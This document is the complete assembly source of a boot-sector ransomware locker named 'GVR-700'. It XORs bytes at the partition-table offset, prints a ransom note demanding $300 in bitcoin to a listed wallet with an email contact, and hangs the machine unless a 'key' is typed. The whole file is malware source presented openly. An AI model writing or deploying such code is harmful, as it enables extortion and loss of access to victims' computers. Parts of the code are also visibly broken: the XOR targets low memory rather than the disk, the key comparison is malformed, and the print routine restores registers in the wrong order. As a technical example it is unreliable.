[bits 16]
[org 0x7c00]

xor ax, ax
mov ax, 0x7c00
mov sp, ax
mov bp, sp

;; Set video mode
mov ah, 0x00
mov al, 0x03
int 0x10

;; Encrypt everything at the partition table.
;; 0x01be -- 0x01ee
;; source: https://wiki.osdev.org/Partition_Table

;; XOR
mov bx, 0x01be
mov si, 0
.L2oop:
	cmp si, 48
	je .Ex2it
	xor word [bx], 0xff44
	
	inc si
	inc bx
	jmp .L2oop
.Ex2it:

mov bx, msg1
call printf


xor si, si
.Loop3:
	xor ax, ax
	int 0x16
	mov ch, ah
	mov ah, 0x0e
	int 0x10
	mov [buffer+si], al
	cmp al, 13
	je .Exitttt
	inc si
	jmp .Loop3

.Exitttt:
	cmp [buffer], byte "ff44"
	jne .Loser
	je $

.Loser:
	mov bx, msg2
	call printf
	jmp $


jmp $

msg1: db `You have just been infected by GVR-700! Your MFT has been encrypted.\r\nPay $300 USD worth of BTC to 163FrfVX2BCDgwDpUWGnTftzPwEMfphVDE. Email proof to zdmaj@example.com. We will send the key once we get confirmation of transaction.\r\nKey> `, 0
msg2: db `\r\nWrong! You're stuck here now. If you reboot you're gonna make everything worse!! <3`, 0

printf:
	push ax
	push bx

	mov ah, 0x0e
	.Loop:
		cmp [bx], byte 0
		je .Exit

		mov al, [bx]
		int 0x10
		inc bx
		jmp .Loop
	.Exit:
		pop ax
		pop bx
		ret

buffer times 4 db 0

times 510-($-$$) db 0
dw 0xaa55